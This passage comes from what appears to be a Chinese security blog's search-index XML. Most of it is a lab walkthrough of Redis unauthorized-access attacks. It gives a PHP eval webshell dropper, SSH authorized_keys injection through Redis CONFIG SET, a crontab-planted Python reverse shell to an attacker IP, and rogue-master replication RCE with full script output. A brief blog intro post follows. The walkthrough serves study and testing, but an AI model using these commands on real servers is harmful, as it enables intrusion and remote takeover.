src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis6.png"><br />查看shell.php<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis7.png"><br />当数据库过大时，redis写shell的小技巧：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>set_time_limit(0);<br><span class="hljs-variable">$fp</span>=fopen(<span class="hljs-string">&#x27;mocha.php&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>);<br>fwrite(<span class="hljs-variable">$fp</span>,<span class="hljs-string">&#x27;&lt;?php @eval($_POST[\&quot;mocha\&quot;]);?&gt;&#x27;</span>);<br><span class="hljs-built_in">exit</span>();<br>?&gt;<br></code></pre></td></tr></table></figure><h4 id="4-2-利用“公私钥”认证获取root权限"><a href="#4-2-利用“公私钥”认证获取root权限" class="headerlink" title="4.2 利用“公私钥”认证获取root权限"></a>4.2 利用“公私钥”认证获取root权限</h4><p>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。<br />靶机中开启redis服务：redis-server &#x2F;etc&#x2F;redis.conf<br />在靶机中执行  mkdir &#x2F;root&#x2F;.ssh  命令，创建ssh公钥存放目录（靶机是作为ssh服务器使用的）<br />在攻击机中生成ssh公钥和私钥，密码设置为空：<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/redis8.png"><br />进入.ssh目录：cd .ssh&#x2F;，将生成的公钥保存到1.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>; <span class="hljs-built_in">cat</span> id_rsa.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; 1.txt<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/9.png"><br />链接靶机上的redis服务，<br />将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 1.txt | redis-cli -h 192.168.0.110 -x <span class="hljs-built_in">set</span> crack<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/10.png"></p><p><br />远程登录靶机的redis服务：redis-cli -h 192.168.0.104 <br />并使用 CONFIG GET dir 命令得到redis备份的路径：<br />更改redis备份路径为ssh公钥存放目录（一般默认为&#x2F;root&#x2F;.ssh)<br />设置上传公钥的备份文件名字为authorized_keys：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">config get <span class="hljs-built_in">dir</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh<br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/11.png"></p><p><br />检查是否更改成功（查看有没有authorized_keys文件)，没有问题就保存然后退出</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">config get dbfilename<br></code></pre></td></tr></table></figure><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/12.png"><br />至此成功写入ssh公钥到靶机<br />在攻击机上使用ssh免密登录靶机：ssh -i id_rsa <a href="mailto:&#114;&#x6f;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#48;&#x2e;&#49;&#x31;&#x30;">&#114;&#x6f;&#111;&#116;&#x40;&#x31;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#x2e;&#48;&#x2e;&#49;&#x31;&#x30;</a><br />成功登录<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/13.png"></p><h4 id="4-3-利用Crontab反弹shell"><a href="#4-3-利用Crontab反弹shell" class="headerlink" title="4.3 利用Crontab反弹shell"></a>4.3 利用Crontab反弹shell</h4><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p><p>在攻击者服务器上监听一个端口（未被占用的任意端口）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvnp 7777<br></code></pre></td></tr></table></figure><ul><li>攻击步骤</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">redis-cli -h 192.168.0.110<br><br><span class="hljs-built_in">set</span> xxx  <span class="hljs-string">&quot;\n* * * * * /usr/bin/python -c &#x27;import socket,subprocess,os,sys;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;192.168.0.111\&quot;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span><br><br><br><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /var/spool/cron<br><br>config <span class="hljs-built_in">set</span> dbfilename root<br><br>save<br></code></pre></td></tr></table></figure><p><br /> <img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/14.png"><br /> <br />登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/15.png"></p><p>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，<br />因为自己如果不使用redis写任务计划文件，而是正常向&#x2F;etc&#x2F;cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。</p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/16.png"></p><ul><li><strong>解决办法（未完待续）</strong></li></ul><p>发现ubantu下默认使用&#x2F;bin&#x2F;dash执行脚本的问题，解决方式:将shell环境修改为bash。<br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/17.png"></p><h4 id="4-4-通过主从复制-GetShell"><a href="#4-4-通过主从复制-GetShell" class="headerlink" title="4.4 通过主从复制 GetShell"></a>4.4 通过主从复制 GetShell</h4><h5 id="4-4-1-redis主从复制"><a href="#4-4-1-redis主从复制" class="headerlink" title="4.4.1 redis主从复制"></a>4.4.1 redis主从复制</h5><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>这里我们开两台docker来做测试</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ubuntu</span>@VM-<span class="hljs-number">1</span>-<span class="hljs-number">7</span>-ubuntu:~/lorexxar$ sudo docker ps<br><span class="hljs-attribute">CONTAINER</span> ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-attribute">3fdb2479af9c</span>        redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>           <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">22</span> hours ago        Up <span class="hljs-number">4</span> seconds        <span class="hljs-number">0.0.0.0:6380</span>-&gt;<span class="hljs-number">6379</span>/tcp   epic_khorana<br><span class="hljs-attribute">3e313c7498c2</span>        redis:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>           <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   <span class="hljs-number">23</span> hours ago        Up <span class="hljs-number">23</span> hours         <span class="hljs-number">0.0.0.0:6379</span>-&gt;<span class="hljs-number">6379</span>/tcp   vibrant_hodgkin<br></code></pre></td></tr></table></figure><p>然后通过slaveof可以设置主从状态</p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/18.png"><br />这样一来数据就会自动同步了</p><h5 id="4-4-2-redis模块"><a href="#4-4-2-redis模块" class="headerlink" title="4.4.2 redis模块"></a>4.4.2 redis模块</h5><p>在了解了主从同步之后，我们还需要对redis的模块有所了解。<br />在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。<br />编写恶意so文件的代码<br /><a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><h5 id="4-4-3-利用原理"><a href="#4-4-3-利用原理" class="headerlink" title="4.4.3 利用原理"></a>4.4.3 利用原理</h5><p>Pavel Toporkov在2018年的zeronights会议上，分享了关于这个漏洞的详细原理。<br /><a href="https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf">https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf</a></p><p><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/19.png"></p><h5 id="4-4-4-复现过程"><a href="#4-4-4-复现过程" class="headerlink" title="4.4.4 复现过程"></a>4.4.4 复现过程</h5><p>选择使用模拟的恶意服务端来作为主机，并模拟fullresync请求。</p><ul><li>第一个脚本</li></ul><p><a href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br />然后直接通过脚本来攻击服务端</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">──(root💀kali)-[~/mytools/new/redis-rogue-getshell]<br>└─# ./redis-master.py -r 192.168.0.110 -p 6379 -L 192.168.0.111 -P 8888 -f RedisModulesSDK/exp.so -c &quot;id&quot;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$7\r<span class="hljs-symbol">\n</span>SLAVEOF\r<span class="hljs-symbol">\n</span>$13\r<span class="hljs-symbol">\n</span>192.168.0.111\r<span class="hljs-symbol">\n</span>$4\r<span class="hljs-symbol">\n</span>8888\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*4\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>CONFIG\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>SET\r<span class="hljs-symbol">\n</span>$10\r<span class="hljs-symbol">\n</span>dbfilename\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>exp.so\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;PING\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;REPLCONF listening-port 6379\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;REPLCONF capa eof capa psync2\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;PSYNC af12f81deb86c2f8397ae9077ea01eea50e506c1 1\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>MODULE\r<span class="hljs-symbol">\n</span>$4\r<span class="hljs-symbol">\n</span>LOAD\r<span class="hljs-symbol">\n</span>$8\r<span class="hljs-symbol">\n</span>./exp.so\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$7\r<span class="hljs-symbol">\n</span>SLAVEOF\r<span class="hljs-symbol">\n</span>$2\r<span class="hljs-symbol">\n</span>NO\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>ONE\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*4\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>CONFIG\r<span class="hljs-symbol">\n</span>$3\r<span class="hljs-symbol">\n</span>SET\r<span class="hljs-symbol">\n</span>$10\r<span class="hljs-symbol">\n</span>dbfilename\r<span class="hljs-symbol">\n</span>$8\r<span class="hljs-symbol">\n</span>dump.rdb\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; send data: b&#x27;*2\r<span class="hljs-symbol">\n</span>$11\r<span class="hljs-symbol">\n</span>system.exec\r<span class="hljs-symbol">\n</span>$2\r<span class="hljs-symbol">\n</span>id\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;$49\r<span class="hljs-symbol">\n</span>euid=999(redis) gid=999(redis) groups=999(redis)<span class="hljs-symbol">\n</span>\r<span class="hljs-symbol">\n</span>&#x27;<br>euid=999(redis) gid=999(redis) groups=999(redis)<br><br>&gt;&gt; send data: b&#x27;*3\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>MODULE\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>UNLOAD\r<span class="hljs-symbol">\n</span>$6\r<span class="hljs-symbol">\n</span>system\r<span class="hljs-symbol">\n</span>&#x27;<br>&gt;&gt; receive data: b&#x27;+OK\r<span class="hljs-symbol">\n</span>&#x27;<br></code></pre></td></tr></table></figure><ul><li>第二个脚本</li></ul><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><img src="/../img/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%9D%E6%8E%A2/20.png"></p><h2 id="三、参考"><a href="#三、参考" class="headerlink" title="三、参考"></a>三、参考</h2><p><a href="https://lorexxar.cn/2019/07/10/redis-5-x-rce/">https://lorexxar.cn/2019/07/10/redis-5-x-rce/</a><br /><a href="https://github.com/vulhub/vulhub/tree/master/redis/4-unacc">https://github.com/vulhub/vulhub/tree/master/redis/4-unacc</a><br /><a href="https://www.cnblogs.com/websec80/articles/14734623.html">https://www.cnblogs.com/websec80/articles/14734623.html</a><br /><a href="https://www.cnblogs.com/bmjoker/p/9548962.html">https://www.cnblogs.com/bmjoker/p/9548962.html</a><br /><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a><br /><a href="https://blog.xray.cool/post/learning-redis-security">https://blog.xray.cool/post/learning-redis-security</a></p>]]></content>
    
    
    <categories>
      
      <category>web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>开端</title>
    <link href="/2023/04/20/%E5%BC%80%E7%AB%AF/"/>
    <url>/2023/04/20/%E5%BC%80%E7%AB%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="Hello-blog"><a href="#Hello-blog" class="headerlink" title="Hello blog"></a>Hello blog</h1><p>很早之前就想搭建一个博客，写一点东西，后续博客更新内容如下：</p><ul><li>网络安全</li><li>渗透测试</li><li>甲方安全</li><li>代码</li><li>杂谈</li><li>日常生活</li></ul><p>后续随缘更新…..</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂谈</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
